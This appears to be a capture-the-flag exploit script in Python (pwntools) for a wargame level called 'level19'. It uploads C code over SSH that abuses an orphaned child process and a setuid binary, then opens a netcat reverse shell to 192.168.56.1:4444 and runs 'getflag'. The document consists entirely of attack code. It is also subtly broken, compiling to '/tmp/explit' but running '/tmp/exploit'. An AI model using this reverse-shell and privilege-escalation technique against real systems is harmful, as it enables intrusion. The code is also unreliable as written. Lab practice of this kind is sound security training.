#!/usr/bin/python3

from pwn import *
from sys import argv,exit
from time import sleep

if len(argv) < 2:
	sys.exit(f"{argv[0]} Target_IP") 

exploit = '''#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv, char **envp){
        int child;
        child = fork();
        if(child >= 0){
            if(child == 0){
                sleep(1);
                setresuid(geteuid(),geteuid(),geteuid());
                char *args[] = {"/bin/sh", "-c", "nc.traditional 192.168.56.1 4444 -e /bin/sh", NULL};
                execve("/home/flag19/flag19", args, envp);
            }
        }
        exit(0);
}'''

file = open('/tmp/exploit.c','w')
file.write(exploit)
file.close()

level19 = ssh(host=argv[1],user='level19',password='level19')
level19.upload_file('/tmp/exploit.c',remote='/tmp/exploit.c')
level19_shell = level19.shell('/bin/sh')
level19_shell.sendline('gcc /tmp/exploit.c -o /tmp/explit')
netcat = process(['nc','-nvlp','4444'])
level19_shell.sendline('/tmp/exploit')
sleep(1)
netcat.sendline('getflag')
netcat.interactive()